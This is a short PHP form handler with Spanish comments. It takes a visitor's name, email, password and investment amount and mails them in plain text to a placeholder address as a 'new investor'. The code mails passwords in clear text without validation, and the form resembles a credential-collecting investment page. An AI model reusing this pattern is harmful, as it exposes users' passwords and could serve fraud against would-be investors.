<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $nombre = $_POST['nombre'];
    $email = $_POST['email'];
    $contraseña = $_POST['contraseña'];
    $monto = $_POST['monto'];

    // Aquí puedes agregar el código para guardar los datos en una base de datos o enviarlos por correo electrónico
    // Por ejemplo, puedes usar la función mail() de PHP para enviar un correo electrónico con los datos

    $destinatario = "tu_correo@example.com";
    $asunto = "Nuevo inversor";
    $mensaje = "Nombre: $nombre\nEmail: $email\nContraseña: $contraseña\nMonto: $monto";
    $cabeceras = "From: no-reply@tusitio.com";

    mail($destinatario, $asunto, $mensaje, $cabeceras);

    // Redirige al usuario a una página de confirmación
    header("Location: confirmacion.html");
}
?>
